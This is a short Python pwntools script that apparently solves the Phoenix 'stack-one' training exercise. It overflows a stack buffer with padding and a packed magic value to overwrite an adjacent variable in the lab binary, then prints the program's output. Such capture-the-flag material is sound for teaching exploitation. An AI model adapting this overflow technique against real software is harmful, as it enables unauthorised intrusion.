#!/usr/bin/env python3
from pwn import *

context.log_level = "critical"

payload = b"A" * cyclic_find(0x61616171) + p32(0x496C5962)
io = process(["/opt/phoenix/amd64/stack-one", payload])
print(io.recvline().decode("ascii"))
print(io.recvline().decode("ascii"))
